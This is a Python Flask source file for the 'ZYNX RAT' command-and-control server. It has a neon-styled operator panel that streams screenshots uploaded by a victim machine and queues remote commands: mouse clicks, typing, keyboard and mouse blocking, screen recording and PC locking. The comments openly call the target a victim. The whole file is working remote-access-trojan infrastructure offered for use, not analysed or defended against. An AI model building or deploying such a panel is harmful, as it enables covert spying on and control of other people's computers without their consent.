# app.py - ФИНАЛЬНАЯ ВЕРСИЯ ДЛЯ RENDER (ZYNX RAT)
# Стиль: Киберпанк / Тёмный с неоном

from flask import Flask, request, jsonify, send_file, render_template_string
import base64
import io
import os
import time
import json
from PIL import Image

app = Flask(__name__)

# ==================== ХРАНИЛИЩЕ ====================
current_screen = None
clients = 0
command_queue = []
last_update = 0

# ==================== HTML СТРАНИЦА (АДМИНКА) ====================
HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZYNX RAT</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0a0a12;
            font-family: 'Orbitron', sans-serif;
            color: #00d4ff;
            min-height: 100vh;
            padding: 15px;
            overflow: hidden;
            background-image:
                radial-gradient(ellipse at 10% 20%, rgba(0, 212, 255, 0.05) 0%, transparent 50%),
                radial-gradient(ellipse at 90% 80%, rgba(0, 212, 255, 0.03) 0%, transparent 50%);
        }

        .container {
            display: flex;
            flex-direction: column;
            height: 100vh;
            max-width: 100%;
        }

        /* ===== HEADER ===== */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 24px;
            border: 1px solid rgba(0, 212, 255, 0.15);
            border-radius: 12px;
            margin-bottom: 10px;
            background: rgba(0, 212, 255, 0.03);
            backdrop-filter: blur(10px);
            flex-shrink: 0;
        }

        .header .logo {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .header .logo i {
            font-size: 28px;
            color: #00d4ff;
            filter: drop-shadow(0 0 15px rgba(0, 212, 255, 0.3));
            animation: logoPulse 3s ease-in-out infinite;
        }

        @keyframes logoPulse {
            0%, 100% { filter: drop-shadow(0 0 15px rgba(0, 212, 255, 0.3)); }
            50% { filter: drop-shadow(0 0 30px rgba(0, 212, 255, 0.6)); }
        }

        .header .logo h1 {
            font-size: 22px;
            font-weight: 900;
            letter-spacing: 4px;
            background: linear-gradient(90deg, #00d4ff, #00ff88, #00d4ff);
            background-size: 200%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: gradientMove 4s ease-in-out infinite;
        }

        @keyframes gradientMove {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }

        .header .logo .badge {
            font-size: 9px;
            background: rgba(0, 212, 255, 0.1);
            border: 1px solid rgba(0, 212, 255, 0.2);
            border-radius: 20px;
            padding: 2px 12px;
            color: #00d4ff;
            letter-spacing: 2px;
            -webkit-text-fill-color: #00d4ff;
            animation: badgeGlow 2s infinite;
        }

        @keyframes badgeGlow {
            0%, 100% { border-color: rgba(0, 212, 255, 0.2); }
            50% { border-color: rgba(0, 212, 255, 0.5); }
        }

        .header .status {
            display: flex;
            gap: 20px;
            font-size: 10px;
            letter-spacing: 1px;
        }

        .header .status .stat {
            display: flex;
            align-items: center;
            gap: 6px;
            opacity: 0.7;
        }

        .header .status .stat i {
            font-size: 14px;
        }

        .header .status .online {
            color: #00ff88;
        }

        .header .status .offline {
            color: #ff4444;
        }

        /* ===== VIDEO BOX ===== */
        .video-box {
            flex: 1;
            background: #06060e;
            border: 1px solid rgba(0, 212, 255, 0.1);
            border-radius: 16px;
            overflow: hidden;
            position: relative;
            cursor: crosshair;
            min-height: 400px;
            transition: border-color 0.4s;
        }

        .video-box:hover {
            border-color: rgba(0, 212, 255, 0.3);
        }

        .video-box img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            display: block;
        }

        .video-box .placeholder {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: #00d4ff;
            opacity: 0.3;
            text-align: center;
            pointer-events: none;
        }

        .video-box .placeholder i {
            font-size: 64px;
            display: block;
            margin-bottom: 15px;
            animation: float 3s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-15px); }
        }

        .video-box .placeholder span {
            font-size: 12px;
            letter-spacing: 3px;
            opacity: 0.6;
        }

        .video-box .scanline {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(0deg,
                transparent 0px,
                transparent 3px,
                rgba(0, 212, 255, 0.015) 3px,
                rgba(0, 212, 255, 0.015) 4px
            );
            pointer-events: none;
            animation: scanMove 10s linear infinite;
        }

        @keyframes scanMove {
            0% { background-position: 0 0; }
            100% { background-position: 0 100%; }
        }

        .video-box .corner {
            position: absolute;
            width: 20px;
            height: 20px;
            border-color: rgba(0, 212, 255, 0.15);
            border-style: solid;
            border-width: 0;
        }

        .video-box .corner.tl { top: 12px; left: 12px; border-top-width: 2px; border-left-width: 2px; }
        .video-box .corner.tr { top: 12px; right: 12px; border-top-width: 2px; border-right-width: 2px; }
        .video-box .corner.bl { bottom: 12px; left: 12px; border-bottom-width: 2px; border-left-width: 2px; }
        .video-box .corner.br { bottom: 12px; right: 12px; border-bottom-width: 2px; border-right-width: 2px; }

        /* ===== CONTROLS ===== */
        .controls {
            display: flex;
            gap: 8px;
            padding: 10px 0;
            flex-shrink: 0;
            flex-wrap: wrap;
            justify-content: center;
        }

        .btn {
            background: rgba(0, 212, 255, 0.04);
            color: #00d4ff;
            border: 1px solid rgba(0, 212, 255, 0.12);
            border-radius: 10px;
            padding: 10px 16px;
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            font-size: 10px;
            letter-spacing: 1px;
            cursor: pointer;
            transition: all 0.25s ease;
            user-select: none;
            touch-action: manipulation;
            display: flex;
            align-items: center;
            gap: 8px;
            position: relative;
            overflow: hidden;
            min-height: 44px;
        }

        .btn i {
            font-size: 16px;
            transition: transform 0.3s;
        }

        .btn:hover {
            background: rgba(0, 212, 255, 0.08);
            border-color: rgba(0, 212, 255, 0.25);
            transform: translateY(-2px);
            box-shadow: 0 8px 30px rgba(0, 212, 255, 0.05);
        }

        .btn:hover i {
            transform: scale(1.1);
        }

        .btn:active {
            transform: scale(0.94);
        }

        .btn.active {
            background: rgba(0, 212, 255, 0.12);
            border-color: #00d4ff;
            box-shadow: 0 0 40px rgba(0, 212, 255, 0.08);
            animation: btnGlow 2s infinite;
        }

        @keyframes btnGlow {
            0%, 100% { box-shadow: 0 0 20px rgba(0, 212, 255, 0.05); }
            50% { box-shadow: 0 0 40px rgba(0, 212, 255, 0.15); }
        }

        .btn.danger {
            border-color: rgba(255, 0, 68, 0.2);
            color: #ff0044;
        }

        .btn.danger:hover {
            background: rgba(255, 0, 68, 0.08);
            border-color: rgba(255, 0, 68, 0.35);
        }

        .btn.danger.active {
            background: rgba(255, 0, 68, 0.12);
            border-color: #ff0044;
            box-shadow: 0 0 40px rgba(255, 0, 68, 0.1);
        }

        .btn .ripple {
            position: absolute;
            border-radius: 50%;
            background: rgba(0, 212, 255, 0.1);
            transform: scale(0);
            animation: rippleAnim 0.6s linear;
            pointer-events: none;
        }

        @keyframes rippleAnim {
            to { transform: scale(4); opacity: 0; }
        }

        .btn.full {
            flex: 1;
            justify-content: center;
            min-width: 100px;
        }

        /* ===== TOAST ===== */
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%) translateY(20px);
            background: rgba(0, 212, 255, 0.06);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(0, 212, 255, 0.12);
            border-radius: 12px;
            padding: 12px 28px;
            color: #00d4ff;
            font-size: 12px;
            font-weight: 600;
            letter-spacing: 1px;
            opacity: 0;
            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
            pointer-events: none;
            z-index: 999;
            display: flex;
            align-items: center;
            gap: 10px;
            font-family: 'Orbitron', sans-serif;
        }

        .toast i {
            font-size: 16px;
        }

        .toast.show {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
        }

        /* ===== KEYBOARD INPUT ===== */
        .keyboard-input {
            display: none;
            position: fixed;
            bottom: 100px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(10, 10, 18, 0.96);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(0, 212, 255, 0.12);
            border-radius: 16px;
            padding: 20px;
            z-index: 1000;
            min-width: 350px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
            animation: slideUp 0.3s ease;
        }

        @keyframes slideUp {
            from { transform: translateX(-50%) translateY(30px); opacity: 0; }
            to { transform: translateX(-50%) translateY(0); opacity: 1; }
        }

        .keyboard-input input {
            background: rgba(0, 212, 255, 0.04);
            color: #00d4ff;
            border: 1px solid rgba(0, 212, 255, 0.12);
            border-radius: 10px;
            padding: 12px 16px;
            width: 100%;
            font-size: 16px;
            outline: none;
            font-family: 'Orbitron', sans-serif;
            letter-spacing: 1px;
            transition: border-color 0.3s;
        }

        .keyboard-input input:focus {
            border-color: rgba(0, 212, 255, 0.3);
        }

        .keyboard-input .hint {
            font-size: 9px;
            opacity: 0.25;
            margin-top: 8px;
            text-align: center;
            letter-spacing: 2px;
        }

        /* ===== INFO PANEL ===== */
        .info-panel {
            display: flex;
            gap: 20px;
            font-size: 9px;
            opacity: 0.3;
            padding: 5px 10px;
            flex-shrink: 0;
            justify-content: center;
            letter-spacing: 1px;
        }

        .info-panel i {
            margin-right: 4px;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 768px) {
            .header { flex-direction: column; gap: 8px; padding: 12px; }
            .header .logo h1 { font-size: 16px; }
            .header .status { font-size: 8px; gap: 10px; flex-wrap: wrap; justify-content: center; }
            .controls { gap: 6px; }
            .btn { padding: 8px 12px; font-size: 8px; min-height: 38px; }
            .btn i { font-size: 13px; }
            .keyboard-input { min-width: 280px; padding: 15px; }
            .info-panel { font-size: 7px; flex-wrap: wrap; }
            .video-box .placeholder i { font-size: 40px; }
            .video-box .corner { width: 12px; height: 12px; }
        }

        @media (max-width: 480px) {
            body { padding: 8px; }
            .header .logo h1 { font-size: 14px; }
            .header .logo .badge { font-size: 7px; padding: 1px 8px; }
            .header .logo i { font-size: 20px; }
            .btn { padding: 6px 10px; font-size: 7px; min-height: 32px; }
            .btn i { font-size: 11px; }
            .toast { font-size: 10px; padding: 8px 16px; }
        }
    </style>
</head>
<body>
    <div class="container">

        <!-- HEADER -->
        <div class="header">
            <div class="logo">
                <i class="fas fa-skull"></i>
                <h1>ZYNX RAT</h1>
                <span class="badge">v3.0</span>
            </div>
            <div class="status">
                <span class="stat"><i class="fas fa-circle" id="statusDot" style="color:#ff4444;"></i> <span id="statusText" class="offline">OFFLINE</span></span>
                <span class="stat"><i class="fas fa-users"></i> <span id="clients">0</span></span>
                <span class="stat"><i class="fas fa-tachometer-alt"></i> <span id="fps">0</span> FPS</span>
                <span class="stat"><i class="fas fa-expand"></i> <span id="resolution">-</span></span>
            </div>
        </div>

        <!-- VIDEO BOX -->
        <div class="video-box" id="videoBox">
            <img id="screen" src="/screen" alt="Screen">
            <div class="scanline"></div>
            <div class="corner tl"></div>
            <div class="corner tr"></div>
            <div class="corner bl"></div>
            <div class="corner br"></div>
            <div class="placeholder" id="placeholder">
                <i class="fas fa-desktop"></i>
                <span>AWAITING CONNECTION...</span>
            </div>
        </div>

        <!-- CONTROLS -->
        <div class="controls">
            <button class="btn" id="kbBtn" onclick="toggleKb()"><i class="fas fa-keyboard"></i> BLOCK KB</button>
            <button class="btn" id="msBtn" onclick="toggleMs()"><i class="fas fa-mouse"></i> BLOCK MS</button>
            <button class="btn" onclick="sendCommand('screenshot')"><i class="fas fa-camera"></i> SCREEN</button>
            <button class="btn" id="recBtn" onclick="toggleRecord()"><i class="fas fa-video"></i> RECORD</button>
            <button class="btn" onclick="showKeyboard()"><i class="fas fa-edit"></i> TYPE</button>
            <button class="btn" onclick="sendCommand('lock')"><i class="fas fa-lock"></i> LOCK PC</button>
            <button class="btn danger" onclick="sendCommand('disconnect')"><i class="fas fa-power-off"></i> KILL</button>
        </div>

        <!-- INFO -->
        <div class="info-panel">
            <span><i class="fas fa-mouse-pointer"></i> Click on screen → control mouse</span>
            <span><i class="fas fa-scroll"></i> Scroll → scroll victim</span>
            <span><i class="fas fa-keyboard"></i> TYPE → send text</span>
        </div>

    </div>

    <!-- TOAST -->
    <div class="toast" id="toast"><i class="fas fa-info-circle"></i> <span id="toastText">Ready</span></div>

    <!-- KEYBOARD INPUT -->
    <div class="keyboard-input" id="keyboardInput">
        <input type="text" id="textInput" placeholder="Type message and press Enter...">
        <div class="hint">PRESS ENTER TO SEND</div>
    </div>

    <script>
        // ====== DOM ======
        const screen = document.getElementById('screen');
        const placeholder = document.getElementById('placeholder');
        const statusText = document.getElementById('statusText');
        const statusDot = document.getElementById('statusDot');
        const clientsEl = document.getElementById('clients');
        const fpsEl = document.getElementById('fps');
        const resolutionEl = document.getElementById('resolution');
        const videoBox = document.getElementById('videoBox');
        const toast = document.getElementById('toast');
        const toastText = document.getElementById('toastText');
        const keyboardInput = document.getElementById('keyboardInput');
        const textInput = document.getElementById('textInput');

        let connected = false;
        let frameCount = 0;
        let lastFpsUpdate = Date.now();
        let mouseBlocked = false;
        let kbBlocked = false;
        let recording = false;
        let toastTimer = null;

        // ====== TOAST ======
        function showToast(text, icon = 'fa-info-circle') {
            toastText.textContent = text;
            toast.querySelector('i').className = 'fas ' + icon;
            toast.classList.add('show');
            clearTimeout(toastTimer);
            toastTimer = setTimeout(() => toast.classList.remove('show'), 2000);
        }

        // ====== VIDEO ======
        function updateScreen() {
            screen.src = '/screen?_=' + Date.now();
            frameCount++;
            const now = Date.now();
            if (now - lastFpsUpdate > 1000) {
                fpsEl.textContent = frameCount;
                frameCount = 0;
                lastFpsUpdate = now;
            }
        }
        setInterval(updateScreen, 50);

        screen.onload = function() {
            placeholder.style.display = 'none';
            if (!connected) {
                connected = true;
                statusText.textContent = 'ONLINE';
                statusText.className = 'online';
                statusDot.style.color = '#00ff88';
                showToast('Connection established', 'fa-check-circle');
                fetch('/status')
                    .then(r => r.json())
                    .then(data => {
                        if (data.resolution) resolutionEl.textContent = data.resolution;
                    });
            }
        };

        screen.onerror = function() {
            if (connected) {
                connected = false;
                statusText.textContent = 'OFFLINE';
                statusText.className = 'offline';
                statusDot.style.color = '#ff4444';
                placeholder.style.display = 'block';
                showToast('Connection lost', 'fa-exclamation-triangle');
            }
        };

        // ====== MOUSE CONTROLS ======
        videoBox.addEventListener('click', function(e) {
            const rect = this.getBoundingClientRect();
            const x = ((e.clientX - rect.left) / rect.width) * 100;
            const y = ((e.clientY - rect.top) / rect.height) * 100;
            sendCommand('click', {x: x, y: y, button: 'left'});
            showToast('Left click', 'fa-mouse-pointer');
        });

        videoBox.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            const rect = this.getBoundingClientRect();
            const x = ((e.clientX - rect.left) / rect.width) * 100;
            const y = ((e.clientY - rect.top) / rect.height) * 100;
            sendCommand('click', {x: x, y: y, button: 'right'});
            showToast('Right click', 'fa-mouse-pointer');
        });

        videoBox.addEventListener('wheel', function(e) {
            e.preventDefault();
            const delta = e.deltaY > 0 ? 'down' : 'up';
            sendCommand('scroll', {delta: delta});
            showToast('Scroll ' + delta, 'fa-arrows-up-down');
        });

        // ====== COMMANDS ======
        async function sendCommand(cmd, val) {
            try {
                let url = '/command?cmd=' + encodeURIComponent(cmd);
                if (val !== undefined) {
                    url += '&val=' + encodeURIComponent(JSON.stringify(val));
                }
                await fetch(url);
            } catch(e) {}
        }

        function toggleKb() {
            kbBlocked = !kbBlocked;
            const btn = document.getElementById('kbBtn');
            btn.classList.toggle('active', kbBlocked);
            btn.innerHTML = kbBlocked ? '<i class="fas fa-keyboard"></i> BLOCKED' : '<i class="fas fa-keyboard"></i> BLOCK KB';
            sendCommand('block_kb', kbBlocked);
            showToast(kbBlocked ? 'Keyboard BLOCKED' : 'Keyboard UNLOCKED', 'fa-keyboard');
        }

        function toggleMs() {
            mouseBlocked = !mouseBlocked;
            const btn = document.getElementById('msBtn');
            btn.classList.toggle('active', mouseBlocked);
            btn.innerHTML = mouseBlocked ? '<i class="fas fa-mouse"></i> BLOCKED' : '<i class="fas fa-mouse"></i> BLOCK MS';
            sendCommand('block_mouse', mouseBlocked);
            showToast(mouseBlocked ? 'Mouse BLOCKED' : 'Mouse UNLOCKED', 'fa-mouse');
        }

        function toggleRecord() {
            recording = !recording;
            const btn = document.getElementById('recBtn');
            btn.classList.toggle('active', recording);
            btn.innerHTML = recording ? '<i class="fas fa-stop"></i> STOP' : '<i class="fas fa-video"></i> RECORD';
            sendCommand('record', recording);
            showToast(recording ? 'Recording started' : 'Recording stopped', 'fa-video');
        }

        function showKeyboard() {
            keyboardInput.style.display = 'block';
            textInput.focus();
        }

        textInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                const text = this.value;
                if (text) {
                    sendCommand('type', {text: text});
                    showToast('Typed: ' + text, 'fa-edit');
                    this.value = '';
                    keyboardInput.style.display = 'none';
                }
            }
            if (e.key === 'Escape') {
                keyboardInput.style.display = 'none';
            }
        });

        // ====== STATUS ======
        async function updateStatus() {
            try {
                const resp = await fetch('/status');
                const data = await resp.json();
                clientsEl.textContent = data.clients || 0;
                if (data.resolution) resolutionEl.textContent = data.resolution;
            } catch(e) {}
        }
        setInterval(updateStatus, 2000);
        updateStatus();

        console.log('🎯 ZYNX RAT v3.0');
        console.log('🖱️ Click on screen to control');
        console.log('⌨️ Use TYPE button to send text');
    </script>
</body>
</html>
"""

# ==================== ЭНДПОИНТЫ ====================

@app.route('/')
def index():
    """Главная страница"""
    return render_template_string(HTML)

@app.route('/upload', methods=['POST'])
def upload():
    """Принимает скриншот от жертвы"""
    global current_screen, clients, last_update

    try:
        data = request.get_json()
        if 'frame' in data:
            frame_data = base64.b64decode(data['frame'])
            img = Image.open(io.BytesIO(frame_data))
            current_screen = img
            clients = 1
            last_update = time.time()
            return jsonify({'status': 'ok'})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

    return jsonify({'status': 'error'}), 400

@app.route('/screen')
def screen():
    """Отдаёт скриншот админу"""
    global current_screen

    if current_screen is not None:
        buf = io.BytesIO()
        current_screen.save(buf, format='JPEG', quality=50)
        buf.seek(0)
        return send_file(buf, mimetype='image/jpeg')
    else:
        # Чёрный экран с ZYNX RAT текстом
        img = Image.new('RGB', (800, 600), color='#0a0a12')
        buf = io.BytesIO()
        img.save(buf, format='JPEG')
        buf.seek(0)
        return send_file(buf, mimetype='image/jpeg')

@app.route('/command')
def command():
    """Принимает команды от админа"""
    global command_queue

    cmd = request.args.get('cmd', '')
    val = request.args.get('val', '')

    try:
        if val:
            val = json.loads(val)
    except:
        pass

    print(f"[CMD] {cmd} = {val}")
    command_queue.append({'cmd': cmd, 'val': val})
    return jsonify({'status': 'ok'})

@app.route('/status')
def status():
    """Статус"""
    global current_screen, clients

    resolution = "N/A"
    if current_screen is not None:
        resolution = f"{current_screen.width}x{current_screen.height}"

    return jsonify({
        'clients': clients,
        'status': 'online' if current_screen is not None else 'waiting',
        'resolution': resolution,
        'commands_in_queue': len(command_queue)
    })

@app.route('/pop_command')
def pop_command():
    """Жертва забирает команды"""
    global command_queue

    if command_queue:
        cmd = command_queue.pop(0)
        return jsonify(cmd)
    else:
        return jsonify({'cmd': 'none'})

# ==================== ЗАПУСК ====================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
